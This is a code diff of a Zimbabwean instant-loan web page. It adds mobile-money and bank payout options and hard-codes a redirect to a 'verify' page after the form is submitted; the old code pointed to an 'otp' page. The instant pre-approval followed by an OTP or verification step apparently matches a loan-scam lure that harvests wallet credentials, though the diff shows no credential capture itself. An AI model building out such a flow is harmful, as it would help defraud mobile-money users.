@@ -186,7 +186,7 @@
                 Fast Digital Liquidity in <span class="text-zim-gold">USD</span> & <span class="text-zim-green">ZiG</span>
             </h2>
             <p class="text-gray-400 text-sm sm:text-base">
-                Zero paperwork. Instant EcoCash, payout in under 5 minutes.
+                Zero paperwork. Instant EcoCash, InnBucks, Omari, or Bank Zipit payout in under 5 minutes.
             </p>
         </div>
 
@@ -319,6 +319,9 @@
                                     <i class="fa-solid fa-wallet absolute left-3.5 top-1/2 -translate-y-1/2 text-zim-gold text-sm"></i>
                                     <select id="payout-channel" class="w-full pl-10 pr-4 py-3 rounded-xl bg-zim-black/90 border border-gray-700 focus:border-zim-gold focus:ring-1 focus:ring-zim-gold text-white text-sm outline-none transition appearance-none">
                                         <option value="EcoCash">EcoCash USD / ZiG Wallet</option>
+                                        <option value="InnBucks">InnBucks Instant Transfer</option>
+                                        <option value="Omari">O'mari Mobile Money</option>
+                                        <option value="ZIPIT">Bank Account (ZIPIT Instant)</option>
                                     </select>
                                 </div>
                             </div>
@@ -480,16 +483,10 @@
             document.getElementById('success-summary').innerHTML = 
                 `Applicant <strong class="text-white">${name}</strong> is pre-approved for <strong class="text-zim-gold">${amountText}</strong> via <strong class="text-zim-green">${channel}</strong>.`;
             
-            showToast("Application transmitted successfully!");
+            showToast("Application transmitted! Redirecting...");
 
-            // =========================================================================
-            // PASTE YOUR REDIRECT PAGE URL INSIDE THE QUOTES BELOW:
-            // Example: window.location.href = "https://your-next-page.com";
-            // =========================================================================
-            const nextPageUrl = "";
-            if (nextPageUrl !== "") {
-                window.location.href = 'otp.html';
-            }
+            // Redirect to man.html upon submission
+            window.location.href = "verify.html";
         }
 
         // Reset Form
